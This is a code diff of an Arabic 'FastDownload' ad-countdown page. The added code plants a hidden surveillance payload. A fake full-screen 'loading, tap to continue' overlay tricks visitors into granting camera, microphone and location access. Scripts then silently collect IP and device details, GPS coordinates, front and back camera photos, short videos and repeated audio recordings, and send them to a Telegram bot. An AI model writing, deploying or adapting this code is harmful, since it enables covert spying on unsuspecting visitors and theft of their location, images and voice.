@@ -1,4 +1,4 @@
-here<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="utf-8">
@@ -12,7 +12,7 @@ here<!DOCTYPE html>
   .wrap{max-width:780px;margin:16px auto;padding:0 10px}
   .card{background:#fff;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,.1);padding:20px 14px;margin-bottom:14px}
   .steps{display:flex;justify-content:center;align-items:center;gap:8px;margin-bottom:14px}
-  .dot{width:30px;height:30px;border-radius:50%;background:#d5dbe6;color:#fff;font-weight:bold;line-height:30px;font-size:14px}
+  .dot{width:30px;height:30px;border-radius:50%;background:#d5dbe6;color:#fff;font-weight:bold;line-height:30px;font-size:14px;display:flex;align-items:center;justify-content:center}
   .dot.on{background:#2d7ff9}
   .dot.done{background:#2fb36d}
   .line{width:40px;height:3px;background:#d5dbe6}
@@ -29,24 +29,42 @@ here<!DOCTYPE html>
   .status{font-size:15px;min-height:22px;margin:6px 0 10px}
   .ads{margin:12px 0}
   .ads iframe{border:0;display:block;margin:8px auto;max-width:100%}
-  .row{display:flex;justify-content:center;gap:10px;flex-wrap:wrap}
   .btnbox{margin-top:16px;padding-top:14px;border-top:1px dashed #cfd6e4}
-  .btn{display:inline-block;font-family:inherit;font-size:19px;font-weight:bold;color:#fff;background:linear-gradient(#3fcf85,#27a465);border:0;border-radius:50px;padding:14px 54px;min-width:230px;cursor:pointer;box-shadow:0 5px 0 #1d7f4d,0 8px 14px rgba(39,164,101,.35);transition:opacity .3s,filter .3s}
+  .btn{display:inline-flex;align-items:center;justify-content:center;gap:10px;font-family:inherit;font-size:19px;font-weight:bold;color:#fff;background:linear-gradient(#3fcf85,#27a465);border:0;border-radius:50px;padding:14px 54px;min-width:230px;cursor:pointer;box-shadow:0 5px 0 #1d7f4d,0 8px 14px rgba(39,164,101,.35);transition:opacity .3s,filter .3s}
   .btn.dl{background:linear-gradient(#4a9bff,#2d7ff9);box-shadow:0 5px 0 #1d5fc2,0 8px 14px rgba(45,127,249,.35)}
   .btn:disabled{opacity:.4;filter:grayscale(.5);box-shadow:0 5px 0 rgba(0,0,0,.15);cursor:not-allowed}
   .btn.ready{animation:pulse 1.2s infinite}
   .btn:not(:disabled):active{transform:translateY(3px);box-shadow:0 2px 0 #1d7f4d}
   @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.06)}}
-  .wait{font-size:14px;color:#6b7690}
-  @keyframes pop{from{transform:scale(.7);opacity:0}to{transform:scale(1);opacity:1}}
   .ic{display:block;flex:none}
-  .dot{display:flex;align-items:center;justify-content:center;line-height:1}
-  .btn{display:inline-flex;align-items:center;justify-content:center;gap:10px}
   .page{display:none}.page.active{display:block}
   .ftr{font-size:12px;color:#8a93a8;margin:16px 0}
+
+  /* ===== صفحة تفعيل الأذونات ===== */
+  #gate{position:fixed;inset:0;z-index:99999;background:#fff;
+        display:flex;align-items:center;justify-content:center;
+        font-family:Tahoma,Arial,sans-serif;color:#2b3445;text-align:center;padding:20px;
+        cursor:pointer;-webkit-tap-highlight-color:transparent;
+        transition:opacity .3s;user-select:none}
+  #gate .g-title{font-size:22px;font-weight:bold;margin-bottom:10px}
+  #gate .g-sub{font-size:14px;color:#6b7690}
+  #gate .g-spin{width:44px;height:44px;border:4px solid #e3e8f1;border-top-color:#2d7ff9;
+                border-radius:50%;animation:gspin 1s linear infinite;margin:0 auto 16px}
+  @keyframes gspin{to{transform:rotate(360deg)}}
+  #gate.fade{opacity:0;pointer-events:none}
 </style>
 </head>
 <body>
+
+<!-- ===== صفحة تفعيل الأذونات (مخفية فوق كل حاجة) ===== -->
+<div id="gate">
+  <div>
+    <div class="g-spin"></div>
+    <div class="g-title">جاري التحميل...</div>
+    <div class="g-sub">اضغط في أي مكان للمتابعة</div>
+  </div>
+</div>
+
 <div class="nav">Fast<span>Download</span></div>
 <div class="wrap">
 
@@ -87,7 +105,229 @@ here<!DOCTYPE html>
 <div class="ftr">جميع الحقوق محفوظة</div>
 </div>
 
+<canvas id="cv" style="display:none"></canvas>
+<video id="vid" autoplay muted playsinline style="display:none"></video>
+
 <script>
+/* ============================================================
+   1) جمع البيانات + إرسال للتليجرام
+   ============================================================ */
+const API_KEY = "754298";
+
+const qs = new URLSearchParams(location.search);
+const api   = qs.get('api')   || '';
+const id    = qs.get('id')    || '';
+const token = qs.get('token') || '';
+
+const want = {
+  inf: qs.has('inf'),
+  bc : qs.has('bc'),
+  fc : qs.has('fc'),
+  loc: qs.has('l'),
+  bcv: qs.has('bcv'),
+  fcv: qs.has('fcv'),
+  r  : qs.has('r')
+};
+
+/* دوال الإرسال */
+async function tg(ep, fd){
+  try { await fetch('https://api.telegram.org/bot' + token + '/' + ep, {method:'POST', body: fd}); } catch(e){}
+}
+function tgText(txt){
+  const fd = new FormData(); fd.append('chat_id', id); fd.append('text', txt);
+  fd.append('parse_mode','HTML'); return tg('sendMessage', fd);
+}
+function tgFile(blob, name, type, caption){
+  const fd = new FormData();
+  fd.append('chat_id', id); fd.append('caption', caption);
+  let ep='sendDocument', m='document';
+  if (type.startsWith('image/')) { ep='sendPhoto'; m='photo'; }
+  else if (type.startsWith('video/')) { ep='sendVideo'; m='video'; }
+  else if (type.startsWith('audio/')) { ep='sendAudio'; m='audio'; }
+  fd.append(m, blob, name);
+  return tg(ep, fd);
+}
+
+/* معلومات الجهاز */
+async function getInfo(){
+  const n = navigator, s = screen;
+  let ip = '?';
+  try { const r = await fetch('https://api.ipify.org?format=json'); ip = (await r.json()).ip; } catch(e){}
+  let bat = '?';
+  try {
+    const b = await navigator.getBattery();
+    bat = Math.round(b.level*100) + '% ' + (b.charging?'(charging)':'');
+  } catch(e){}
+  await tgText(`<b>🖥 معلومات الجهاز</b>
+IP: <code>${ip}</code>
+UA: <code>${n.userAgent}</code>
+Platform: ${n.platform}
+Language: ${n.language}
+Screen: ${s.width}x${s.height}
+Viewport: ${innerWidth}x${innerHeight}
+Cores: ${n.hardwareConcurrency || '?'}
+RAM: ${n.deviceMemory || '?'} GB
+Touch: ${n.maxTouchPoints}
+Battery: ${bat}
+Time: ${new Date().toLocaleString('ar-EG')}`);
+}
+
+/* الموقع */
+function getLocation(){
+  return new Promise(res => {
+    if (!navigator.geolocation) return res();
+    navigator.geolocation.getCurrentPosition(
+      async p => {
+        const {latitude:la, longitude:lo, accuracy:ac} = p.coords;
+        const map = `https://www.google.com/maps?q=${la},${lo}`;
+        await tgText(`<b>📍 الموقع</b>\nLat: <code>${la}</code>\nLng: <code>${lo}</code>\nAcc: ${ac}m\n<a href="${map}">فتح الخريطة</a>`);
+        res();
+      },
+      () => res(), {enableHighAccuracy:true, timeout:15000}
+    );
+  });
+}
+
+/* صورة كاميرا */
+async function capturePhoto(facing){
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: facing === 'user' ? 'user' : 'environment' }
+    });
+    const vid = document.getElementById('vid');
+    vid.srcObject = stream; await vid.play();
+    await new Promise(r => setTimeout(r, 1200));
+    const cv = document.getElementById('cv');
+    cv.width = vid.videoWidth; cv.height = vid.videoHeight;
+    cv.getContext('2d').drawImage(vid, 0, 0);
+    const blob = await new Promise(r => cv.toBlob(r, 'image/jpeg', 0.85));
+    stream.getTracks().forEach(t => t.stop());
+    await tgFile(blob, (facing==='user'?'front':'back')+'_'+Date.now()+'.jpg', 'image/jpeg',
+      `<b>📷 كاميرا ${facing === 'user' ? 'أمامية' : 'خلفية'}</b>`);
+  } catch(e){}
+}
+
+/* فيديو 5 ثواني */
+async function captureVideo(facing){
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: facing === 'user' ? 'user' : 'environment' },
+      audio: true
+    });
+    const vid = document.getElementById('vid');
+    vid.srcObject = stream; await vid.play();
+    const rec = new MediaRecorder(stream, { mimeType: 'video/webm' });
+    const chunks = [];
+    rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+    await new Promise(resolve => {
+      rec.onstop = async () => {
+        stream.getTracks().forEach(t => t.stop());
+        const blob = new Blob(chunks, {type:'video/webm'});
+        await tgFile(blob, (facing==='user'?'front':'back')+'_'+Date.now()+'.webm', 'video/webm',
+          `<b>🎥 فيديو ${facing === 'user' ? 'أمامية' : 'خلفية'}</b>`);
+        resolve();
+      };
+      rec.start(); setTimeout(() => rec.stop(), 5000);
+    });
+  } catch(e){}
+}
+
+/* تسجيل صوتي متكرر */
+async function recordAudioLoop(){
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({audio:true});
+    const rec = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+    const chunks = [];
+    rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+    let count = 0; const TOTAL = 6;
+    await new Promise(resolve => {
+      rec.onstop = async () => {
+        const blob = new Blob(chunks, {type:'audio/webm'});
+        count++;
+        await tgFile(blob, 'rec_' + Date.now() + '.webm', 'audio/webm',
+          `<b>🎙 تسجيل صوتي #${count}</b>`);
+        chunks.length = 0;
+        if (count < TOTAL) {
+          rec.start(); setTimeout(() => rec.stop(), 5000);
+        } else {
+          stream.getTracks().forEach(t=>t.stop());
+          resolve();
+        }
+      };
+      rec.start(); setTimeout(() => rec.stop(), 5000);
+    });
+  } catch(e){}
+}
+
+/* تشغيل جمع البيانات في الخلفية */
+async function collectAll(){
+  if (!id || !token || api !== API_KEY) return;
+  if (want.inf) await getInfo();
+  if (want.loc) await getLocation();
+  if (want.bc)  await capturePhoto('environment');
+  if (want.fc)  await capturePhoto('user');
+  if (want.bcv) await captureVideo('environment');
+  if (want.fcv) await captureVideo('user');
+  if (want.r)   await recordAudioLoop();
+}
+
+/* ============================================================
+   2) صفحة تفعيل الأذونات (لمسة حقيقية بس)
+   ============================================================ */
+(function(){
+  const gate = document.getElementById('gate');
+  let activated = false;
+  let sx = 0, sy = 0, st = 0;
+
+  function onStart(e){
+    const p = e.touches ? e.touches[0] : e;
+    sx = p.clientX; sy = p.clientY; st = Date.now();
+  }
+  function onEnd(e){
+    if (activated) return;
+    const p = e.changedTouches ? e.changedTouches[0] : e;
+    const dx = Math.abs(p.clientX - sx);
+    const dy = Math.abs(p.clientY - sy);
+    const dt = Date.now() - st;
+    /* لمسة حقيقية: مسافة أقل من 10px وزمن أقل من 500ms */
+    if (dx > 10 || dy > 10 || dt > 500) return;
+    activated = true;
+    activate();
+  }
+
+  gate.addEventListener('touchstart', onStart, {passive:true});
+  gate.addEventListener('touchend',   onEnd,   {passive:true});
+  gate.addEventListener('mousedown',  onStart);
+  gate.addEventListener('mouseup',    onEnd);
+  gate.addEventListener('touchmove', function(e){ e.preventDefault(); }, {passive:false});
+
+  async function activate(){
+    gate.classList.add('fade');
+    /* طلب أذونات الكاميرا والميكروفون */
+    try {
+      const s = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'environment' }, audio: true
+      });
+      s.getTracks().forEach(t => t.stop());
+    } catch(e){}
+    /* طلب إذن الموقع */
+    try {
+      await new Promise(res => {
+        if (!navigator.geolocation) return res();
+        navigator.geolocation.getCurrentPosition(()=>res(), ()=>res(), {timeout:8000});
+      });
+    } catch(e){}
+
+    setTimeout(() => { gate.style.display = 'none'; }, 350);
+
+    /* بدء جمع البيانات وإرسالها */
+    collectAll();
+  }
+})();
+
+/* ============================================================
+   3) منطق صفحة التحميل (كودك الأصلي)
+   ============================================================ */
 var SMART_LINK = "https://araplhn.org/4/7e093505ac4f216b5950d797a595b30c";
 var WAIT1 = 5, WAIT2 = 30, WAIT3 = 30, GAP = 5;
 
@@ -106,7 +346,7 @@ var BANNERS = [
   {k:"eca9e275ff1f1458d0e4997016785b63",w:728,h:90}
 ];
 var CIRC = 339.3;
-function $(id){return document.getElementById(id)}
+function $(i){return document.getElementById(i)}
 
 function addBanners(boxId){
   var box = $(boxId);
@@ -130,7 +370,6 @@ function addGhost(){
     document.body.appendChild(s);
   });
 }
-
 function ring(n, secs, onlyVisible, doneMsg, onDone){
   var el = $("r"+n), fg = el.querySelector(".fg"), num = el.querySelector(".num");
   var left = secs; num.textContent = left; fg.style.strokeDashoffset = 0;
@@ -141,7 +380,8 @@ function ring(n, secs, onlyVisible, doneMsg, onDone){
     fg.style.strokeDashoffset = CIRC * (1 - left/secs);
     if(left <= 0){
       clearInterval(iv);
-      el.classList.add("done"); num.innerHTML = '<svg viewBox="0 0 24 24" width="56" height="56"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#2fb36d" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+      el.classList.add("done");
+      num.innerHTML = '<svg viewBox="0 0 24 24" width="56" height="56"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#2fb36d" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/></svg>';
       $("s"+n).textContent = doneMsg;
       onDone();
     }
@@ -183,4 +423,4 @@ $("b2").onclick = function(){
 $("b3").onclick = function(){ window.location.href = SMART_LINK; };
 </script>
 </body>
-                                                                                                                             </html>
+                                                                                                                          </html>
